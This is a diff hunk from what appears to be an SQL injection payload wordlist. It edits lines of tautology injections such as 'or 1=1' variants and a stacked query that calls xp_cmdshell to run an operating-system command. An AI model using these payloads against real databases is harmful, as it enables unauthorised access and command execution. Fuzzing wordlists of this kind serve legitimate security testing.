@@ -32,7 +32,7 @@ x' OR full_name LIKE '%Bob%
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 '
 '%20or%20''='
-'%20or%20'x'='x
+
 %20or%20x=x
 ')%20or%20('x'='x
 0 or 1=1
